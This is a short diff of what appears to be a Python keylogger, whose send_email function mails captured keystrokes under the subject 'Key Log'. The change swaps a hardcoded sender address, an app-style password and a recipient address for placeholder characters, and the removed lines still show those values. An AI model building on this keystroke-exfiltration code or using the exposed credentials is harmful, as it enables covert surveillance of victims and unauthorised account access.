@@ -35,9 +35,9 @@ def on_release(key):
 
 def send_email():
     try:
-        email = "myfakeaccoun625262@gmail.com"
-        password = "yxyk pctc hrjo otaz"
-        send_to_email = "tiwariraghav16@gmail.com"
+        email = "@@@@@@@@@@@@@@@@"
+        password = "**************"
+        send_to_email = "@@@@@@@@@@@@@@@@"
         subject = "Key Log"
 
         # create a user-friendly report of the key log
